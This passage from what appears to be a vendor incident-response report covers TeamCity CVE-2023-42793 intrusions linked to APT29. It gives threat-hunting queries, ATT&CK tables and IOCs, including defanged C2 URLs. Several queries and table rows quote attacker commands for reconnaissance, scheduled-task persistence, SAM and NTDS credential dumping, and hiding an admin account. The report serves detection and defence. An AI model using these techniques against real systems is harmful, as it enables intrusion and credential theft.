  <p>The Fortinet IR team was able to link connections made from the host HOST_1_TEAMCITY from the AnyDesk application to IP address 92.38.177[.]14. When we investigated, it was found to be an AnyDesk software relay address. Using relays as part of AnyDesk infrastructure allows threat actors to abstract their own infrastructure from intrusions. FortiGuard CTS information for the relay IP is shown in Figure 24. It’s worth noting that FortiGuard CTS marked this as clean because AnyDesk is a common remote management tool that, by default, uses AnyDesk infrastructure, which is not malicious by itself.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1436366521.img.png/1702072722391/fig24-teamcity-fortiguard-cts-screen-anydesk-relay-ip-address.png" data-title="Figure 24: Fortiguard CTS screen with information about AnyDesk relay IP address.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1436366521.img.png/1702072722391/fig24-teamcity-fortiguard-cts-screen-anydesk-relay-ip-address.png" alt="Figure 24: Fortiguard CTS screen with information about AnyDesk relay IP address." style="width: 600px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 24: Fortiguard CTS screen with information about AnyDesk relay IP address.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>The connections made by AnyDesk.exe can be seen in Figure 25.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_655770365.img.png/1702072745013/fig25-teamcity-anydesk-tcp-ip-connection-from-host.png" data-title="Figure 25: An Anydesk.exe TCP/IP connection from host HOST_1_TEAMCITY to the internet.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_655770365.img.png/1702072745013/fig25-teamcity-anydesk-tcp-ip-connection-from-host.png" alt="Figure 25: An Anydesk.exe TCP/IP connection from host HOST_1_TEAMCITY to the internet." style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 25: An Anydesk.exe TCP/IP connection from host HOST_1_TEAMCITY to the internet.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>These actors tried one or two methods but did not conduct further activity on the server or victim network. They likely lacked the knowledge or interest to pursue further intrusion on the victim network, as their initial efforts were ineffective.</p>
<h2><span style="font-weight: normal;">Conclusion</span><br />
</h2>
<p>This article provided details of several intrusions where the TeamCity vulnerability CVE-2023-42793 was exploited to gain access to the victim network. Observed exploitation originated from multiple disparate threat actors who employed numerous diverse post-exploitation techniques in an attempt to gain a foothold in the victim network. It should be noted that this activity occurred after the vendor (JetBrains) had provided a valid patch.</p>
<p>While the security controls in place within the victim's environment were able to keep the majority of adversaries at bay, a failure to adequately triage alerts generated by the victim's EDR (FortiEDR) and subsequent downgrading of protections opened gaps in the victim's defenses. This allowed the main threat actor to establish a foothold and eventually gain the access required to maneuver freely through the network.</p>
<p>As part of this intrusion, the main threat actor employed the GraphicalProton malware to maintain access. The main threat actor primarily used Scheduled Tasks (T1053.005<a href="#_ftn23" name="_ftnref1">[23]</a>) to execute these GraphicalProton payloads. Their preferred method of defense evasion for these scheduled tasks was rundll32 proxy execution, but the threat actor was also able to employ several legitimate third-party binaries that were vulnerable to search order hijacking to execute their malware. Given the technique crossover with previously reported activity and the identification of the GraphicalProton payload, FortiGuard believes with medium confidence that this attack was part of a new BlueBravo (tracked by Recorded Future<a href="#_ftn24" name="_ftnref2">[24]</a>)/APT29 (tracked by Mandiant<a href="#_ftn25" name="_ftnref3">[25]</a>) campaign. Of particular note are the significant OPSEC considerations employed throughout the intrusion (discounting the opendir web server fumble): the use of compromised infrastructure local to the victim, search order hijacking with legitimate DLLs added after execution, the quality of masquerading, and the use of single-use infrastructure components.</p>
<p>MITRE ATT&amp;CK mappings, mitigation suggestions, and threat-hunting queries are provided below to assist organizations in identifying similar activity in their environments. IOCs have also been provided for completeness.</p>
<h3><span style="font-weight: normal;">Fortinet Protections</span></h3>
<p>The malware described in this report are detected and blocked by <a href="https://www.fortinet.com/support/support-services/fortiguard-security-subscriptions/antivirus?utm_source=blog&amp;utm_medium=blog&amp;utm_campaign=antivirus" title="AntiVirus">FortiGuard Antivirus</a> as:</p>
<p style="margin-left: 80.0px;">AntiVirus: W64/GraphicalProton.A!tr<br />
AntiVirus: W64/Dukes.O!tr<br />
AntiVirus: W32/Dukes.P!tr<br />
AntiVirus: W32/PossibleThreat<br />
</p>
<p>FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.</p>
<p>Fortinet has also released an IPS signature to proactively protect our customers from the threats contained in the report:</p>
<p style="margin-left: 80.0px;">CVE-2023-42793: <a href="https://www.fortiguard.com/encyclopedia/ips/53952">JetBrains.TeamCity.CVE-2023-42793.Authentication.Bypass</a></p>
<p>The URLs are rated as “Malicious Websites” and “Malicious Activities Found” by the FortiGuard Web Filtering service.</p>
<p>FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.</p>
<p>If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global <a href="https://www.fortinet.com/solutions/enterprise-midsize-business/security-as-a-service/respond?utm_source=blog&amp;utm_medium=blog&amp;utm_campaign=incident-reposnse" title="Incident Response">FortiGuard Incident Response Team</a>.</p>
<h3><span style="font-weight: normal;">Threat Hunting</span></h3>
<p>The following Threat Hunting query will search for a network socket connected by rundll32.exe, which has the same filenames of DLL as those observed in this intrusion.</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">Type: (&quot;Socket Connect&quot;) AND Source.Process.Name: (&quot;rundll32.exe&quot;) AND Source.Process.CommandLine: (&quot;\&quot;AclNumsInvertHost.dll\&quot;, AclNumsInvertHost&quot; OR &quot;\&quot;UnregisterAncestorAppendAuto.dll\&quot;, UnregisterAncestorAppendAuto&quot;)</span></span></span></span></p>
<p>The following Threat Hunting query will search for process creation events where rundll32.exe launches cmd.exe and executes any of the commands executed by the malicious DLL upon execution.</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">Type: (&quot;Process Creation&quot;) AND Source.Process.Name: (&quot;rundll32.exe&quot;) AND Target.Process.File.Name: (&quot;cmd.exe&quot;) AND Target.Process.CommandLine: (&quot;\/C \&quot;chcp 65001 \&gt; NUL &amp; netstat \-afn \-p TCP\&quot;&quot; OR &quot;\/C \&quot;chcp 65001 \&gt; NUL &amp; wmic datafile where Name\=\&quot;C\:\\\\Windows\\\\system32\\\\ntoskrnl.exe\&quot; get Version\&quot;&quot; OR &quot;\/C \&quot;chcp 65001 \&gt; NUL &amp; echo %userdomain%\*%computername%\*\*%username%\&quot;&quot; OR &quot;\/C \&quot;chcp 65001 \&gt; NUL &amp; tasklist\&quot;&quot;)</span></span></span></span></p>
<p>The following Threat Hunting query will search for process creation of scheduled tasks using schtasks.exe with type ONLOGON or ONSTART and with the following filenames (iisexpresstray.exe, AclNumsInvertHost.dll, UnregisterAncestorAppendAuto.dll), which were used throughout this intrusion for persistence.</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">Type: (&quot;Process Creation&quot;) AND Target.Process.File.Name: (&quot;schtasks.exe&quot;) AND Target.Process.CommandLine: (create \/SC AND (ONLOGON OR ONSTART)) AND Target.Process.CommandLine:(iisexpresstray.exe OR AclNumsInvertHost.dll OR UnregisterAncestorAppendAuto.dll OR DefenderUPDService OR IISUpdateService)</span></span></span></span></p>
<p>The following Threat Hunting query will search for an event where a particular task creation was being verified by the threat actor.</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">Type: (&quot;Process Creation&quot;) AND Target.Process.File.Name: (&quot;schtasks.exe&quot;) AND Target.Process.CommandLine: (&quot;\/Query \/TN \\Microsoft\\Windows\\DefenderUPDService \/FO LIST \/V&quot;)</span></span></span></span></p>
<p>The following Threat Hunting query will search for an event where TeamCity process (java.exe) creates a process of Windows task management utility (schtasks.exe). Keep in mind that this query might have false positives where there is an official need for Java applications to launch the schedule task utility.</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">Type: (&quot;Process Creation&quot;) AND Source.Process.Name: (&quot;java.exe&quot;) AND Target.Process.File.Name: (&quot;schtasks.exe&quot;)</span></span></span></span></p>
<p>The following Threat Hunting query will search for an event where schtasks.exe is the target process and the command line contains rundll32.exe. Keep in mind this query might generate false positives in envrionments where there are scheduled tasks having rundll32.exe are created using schtasks.exe.</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">Type: (&quot;Process Creation&quot;) AND target.Process.Name: (&quot;schtasks.exe&quot;) AND Target.Process.CommandLine: (rundll32.exe)</span></span></span></span></p>
<p>The following Threat Hunting query will search for an event where rundll32.exe will connect to login.microsoftonline[.]com or graph.microsoft[.]com over HTTP protocol. Keep in mind that this query might generate false positives where there is a legitimate use of rundll32.exe to connect to these URLs.</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">Type: (&quot;HTTP Request&quot;) AND Source.Process.Name: (&quot;rundll32.exe&quot;) AND URL: (&quot;https\:\/\/login.microsoftonline.com\:443&quot; OR &quot;https\:\/\/graph.microsoft.com\:443&quot;)</span></span></span></span></p>
<h3><span style="font-weight: normal;">MITRE ATT&amp;CK</span></h3>
<h4><span style="font-weight: normal;">TA0042: Resource Development</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1584.004</p>
</td>
<td width="222" valign="top"><p>Compromise Infrastructure: Server</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) had compromised a server of an educational institution. A malicious DLL file connected to this compromised server as a C2. The IR team suspects that this server acts as a connection forwarder to the real C2.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Mitigation is difficult using preventive controls as infrastructure is outside the scope of the enterprise.</p>
<p>Fortinet Security Fabric Controls:<br />
N/A<br />
</p>
</td>
</tr></tbody></table>
<h4><span style="font-weight: normal;">TA0043: Reconnaissance</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1595.002</p>
</td>
<td width="222" valign="top"><p>Active Scanning: Vulnerability Scanning</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) performed vulnerability scans using Nuclei to check if the TeamCity server was vulnerable for CVE-2023-42793.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Traffic pattern inspection for the specific URL pattern used in a vulnerability check can be done. Also, monitoring of network data for uncommon data flows can be done to identify abnormal activity.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiGate, FortiSIEM<br />
</p>
</td>
</tr></tbody></table>
<h4><span style="font-weight: normal;">TA0001: Initial Access</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1190</p>
</td>
<td width="222" valign="top"><p>Exploit Public-Facing Application</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) exploited the vulnerability CVE-2023-42793 of the public-facing TeamCity software host.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Web Application Firewalls may be used to limit exposure of applications to prevent exploit traffic from reaching the application.</p>
<p>Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiWeb, FortiGate, FortiSIEM<br />
</p>
</td>
</tr></tbody></table>
<h4><span style="font-weight: normal;">TA0002: Execution</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1059.003</p>
</td>
<td width="222" valign="top"><p>Command and Scripting Interpreter: Windows Command Shell</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) executed cmd.exe through the vulnerable TeamCity software for various activities, including the download and execution of malicious files.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Blocking network connections from cmd.exe to external IP addresses, except for those on an allow list, is the best way to limit this very prevalent TTP.</p>
<p>Detection of cmd.exe being spawned by software services (e.g. java.exe in current scenario).</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR, FortiGate, FortiSIEM (detection)<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1053.005</p>
</td>
<td width="222" valign="top"><p>Scheduled Task/Job: Scheduled Task</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) used Windows Task Scheduler to create scheduled tasks to execute dropped payloads and maintain persistence.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Audit the scheduled task on the hosts using a SIEM tool to identify abnormal tasks. </p>
<p>Fortinet Security Fabric Controls:<br />
FortiSIEM (detection), FortiEDR, FortiClient<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1047</p>
</td>
<td width="222" valign="top"><p>Windows Management Instrumentation</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) used the Windows Management Instrumentation command-line utility from HOST_1_TEAMCITY to connect to multiple other hosts for lateral movement.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Use application control to block execution of wmic.exe if it is not required for a given system or network. This ensures that potential misuse is prevented.</p>
<p>Advanced EDR products with behavioral detection can detect and block the use of WMIC for malicious behaviors.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiSIEM (detection), FortiEDR, FortiClient<br />
</p>
</td>
</tr></tbody></table>
<h4><span style="font-weight: normal;">TA0003: Persistence</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1136.001</p>
</td>
<td width="222" valign="top"><p>Create Account: Local Account</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) created a Windows local administrator account through cmd.exe.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>New account creation should be audited using Windows logs.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiSIEM (detection)</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1053.005</p>
</td>
<td width="222" valign="top"><p>Scheduled Task/Job: Scheduled Task</p>
</td>
<td width="300" valign="top"><p>The threat actor(s) used Windows Task Scheduler to create scheduled tasks to execute dropped payloads and maintain persistence.</p>
<p> </p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Audit the scheduled task on the hosts using SIEM tool for abnormal tasks. </p>
<p>Fortinet Security Fabric Controls:<br />
FortiSIEM (detection)<br />
</p>
</td>
</tr></tbody></table>
<h4><span style="font-weight: normal;">TA0005: Defense Evasion</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1574.001</p>
</td>
<td width="222" valign="top"><p>Hijack Execution Flow: DLL Search Order Hijacking</p>
</td>
<td width="300" valign="top"><p>Threat actor(s) downloaded a number of legitimate signed executable files and malicious DLLs in the same folder. The malicious DLLs were named similarly but were different from their legitimate counterparts. A full list of vulnerable legitimate software used in this way is available in Table 2 in the report.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR, FortiClient<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0" width="623">
<tbody><tr><td width="101" valign="top"><p>Technique</p>
</td>
<td width="220" valign="top"><p>Technique Description</p>
</td>
<td width="302" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="101" valign="top"><p>T1564.002</p>
</td>
<td width="220" valign="top"><p>Hide Artifacts: Hidden Users</p>
</td>
<td width="302" valign="top"><p>Threat actor(s) created a new local admin account and made that account a special account by adding HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist to the registry path. This prevented the new account from being displayed on the GUI login screen.</p>
</td>
</tr><tr><td width="101" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Monitor executed commands and arguments that could be used to add a new user and subsequently hide it from login screens. Advanced EDR solutions like FortiEDR can be used to monitor for associated registry changes. Windows advanced logs can be ingested into SIEM to monitor these activities.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR, Windows Advanced Logging, FortiSIEM, FortiSOAR<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1027.002</p>
</td>
<td width="222" valign="top"><p>Obfuscated Files or Information: Software Packing</p>
</td>
<td width="300" valign="top"><p>Malicious DLL files were obfuscated to avoid analysis.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Employ heuristic-based malware detection on endpoints and generate alerts for executables packed with known packers.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR, FortiClient<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1218.011</p>
</td>
<td width="222" valign="top"><p>System Binary Proxy Execution: Rundll32</p>
</td>
<td width="300" valign="top"><p>The actor(s) used the Windows utility rundll32.exe to execute malicious DLL files (GraphicalProton). This appeared to be the adversary’s primary/preferred method of DLL execution.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>A behavioral detection tool such as FortiEDR can be used to detect and block malicious activities performed by files executed via rundll32.exe.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR, FortiClient, FortiSIEM, FortiSOAR<br />
</p>
</td>
</tr></tbody></table>
<h4><span style="font-weight: normal;">TA0006: Credential Access</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1003.002</p>
</td>
<td width="222" valign="top"><p>OS Credential Dumping: Security Account Manager</p>
</td>
<td width="300" valign="top"><p>The threat actor had tried to dump SAM using the command ‘reg.exe save HKLM\SAM.’</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>A modern EDR solution should detect and mitigate attempts to access and dump the SAM registry hive.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1003.003</p>
</td>
<td width="222" valign="top"><p>OS Credential Dumping: NTDS</p>
</td>
<td width="300" valign="top"><p>The threat actor had tried to dump Ntds.dit using the Windows utility ntdsutil.exe.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>A modern EDR solution should detect and mitigate attempts to access and dump NTDS files.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR<br />
</p>
</td>
</tr></tbody></table>
<h4><span style="font-weight: normal;">TA0011: Command &amp; Control</span></h4>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1071.001</p>
</td>
<td width="222" valign="top"><p>Application Layer Protocol: Web Protocols</p>
</td>
<td width="300" valign="top"><p>The malicious DLL file made HTTPS web requests to the adversary’s C2.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.</p>
<p>Firewalls should be able to block network connections with anomalous user-agent strings associated with non-standard browsers. This can also reduce the effectiveness of this TTP if the adversary does not configure a user-agent to match the environment. It is possible to block C2 IPs/URLs obtained from a threat intel feed at the gateway level.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR, FortiGate, FortiSIEM, FortiGuard Threat Intelligence<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1219</p>
</td>
<td width="222" valign="top"><p>Remote Access Software</p>
</td>
<td width="300" valign="top"><p>The actor downloaded AnyDesk software as an alternative C2 method to gain direct remote access to victim endpoints.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Application whitelisting is a great way of reducing the effectiveness of this TTP. Where this is not achievable, a modern EDR solution should be able to flag remote access software and other PUPs as suspicious so they can be allowed explicitly if used legitimately in an environment. A network-level IDS (Intrusion Detection System) with the ability to detect AnyDesk software traffic would be able to block this traffic.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiEDR, FortiClient, FortiNDR, FortiAnalyzer, FortiSIEM, FortiSOAR<br />
</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="102" valign="top"><p>Technique</p>
</td>
<td width="222" valign="top"><p>Technique Description</p>
</td>
<td width="300" valign="top"><p>Observed Activity</p>
</td>
</tr><tr><td width="102" valign="top"><p>T1090.003</p>
</td>
<td width="222" valign="top"><p>Proxy: Multi-hop Proxy</p>
</td>
<td width="300" valign="top"><p>The actor used the Tor network to launch exploit attacks.</p>
</td>
</tr><tr><td width="102" valign="top"><p>Mitigation</p>
</td>
<td width="522" colspan="2" valign="top"><p>Traffic to known anonymity networks and C2 infrastructures can be blocked through the use of network allow and block lists. Firewalls with deep inspection (e.g. FortiGate<a href="#_ftn26" name="_ftnref4">[26]</a>) can block Tor traffic through Application Control.</p>
<p>Fortinet Security Fabric Controls:<br />
FortiGate, FortiEDR, FortiClient<br />
</p>
</td>
</tr></tbody></table>
<h3><span style="font-weight: normal;">IOCs</span></h3>
<p>The following IOCs are from the investigation, analysis of the samples, and subsequent activity observed on the same host between initial detection and remediation by the customer. In addition to these IOCs directly observed by the FortiGuard IR team, several samples that match the characteristics of observed samples have been included to assist with detecting historical activity.</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="240" valign="top"><p>Indicator</p>
</td>
<td width="48" valign="top"><p>Indicator Type</p>
</td>
<td width="78" valign="top"><p>Associated Tactic</p>
</td>
<td width="96" valign="top"><p>Notes</p>
</td>
</tr><tr><td width="240" valign="top"><p>a66d76d86448965e57d7be96a57529c497e4b99d</p>
</td>
<td width="48" rowspan="10" valign="top"><p>SHA1 Hash</p>
</td>
<td width="78" rowspan="10" valign="top"><p>Execution</p>
</td>
<td width="96" valign="top"><p>File hash of 1.exe downloaded on host</p>
</td>
</tr><tr><td width="240" valign="top"><p>d4411f70e0dcc2f88d74ae7251d51c6676075f6f</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL AclNumsInvertHost.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>f836173805a8c4d4ee319fdefe4a5e92f3f55f32</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL UnregisterAncestorAppendAuto.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>a4b03f1e981ccdd7e08e786c72283d5551671edf</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL ModeBitmapNumericAnimate.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>8f5780056107dbc2bb59d63f454d8523091ddde2</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL MpCmdHelp.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>51aa6e5186ede77545e99b14b8f7e8180a0c6933</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL oleac.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>4fed3d5de4df20d961831be6194b9d595b943bc9</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL PerformanceCaptionApi.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>682b9ac9448707024985ad54476acfbf642a03b9</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL pdhui_1.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>3a32e516c037c37f7bf83171e167511ba53870a7</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL winmm.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>2df317b8a408d2ad5c94b9de6f20bbef03e46066</p>
</td>
<td width="96" valign="top"><p>File hash of malicious DLL mscorees.dll</p>
</td>
</tr><tr><td width="240" valign="top"><p>hxxp://bringthenoiseappnew.s3.amazonaws[.]com/ujwphtigdcokr</p>
</td>
<td width="48" rowspan="3" valign="top"><p>URL</p>
<p> </p>
</td>
<td width="78" rowspan="3" valign="top"><p>C2</p>
<p> </p>
</td>
<td width="96" valign="top"><p>C2 URL from which malicious executable downloaded</p>
</td>
</tr><tr><td width="240" valign="top"><p>hXXp[:]//103[.]76[.]128[.]34:8080/</p>
</td>
<td width="96" valign="top"><p>C2 URL from which malicious DLLs downloaded</p>
</td>
</tr><tr><td width="240" valign="top"><p>hXXps[:]//fisheries-states-codes-camps[.]trycloudflare[.]com/rcu</p>
</td>
<td width="96" valign="top"><p>C2 URL from which malicious executable downloaded</p>
</td>
</tr><tr><td width="240" valign="top"><p>128[.]199[.]207[.]131</p>
<p> </p>
</td>
<td width="48" rowspan="2" valign="top"><p>IP</p>
</td>
<td width="78" rowspan="2" valign="top"><p>C2</p>
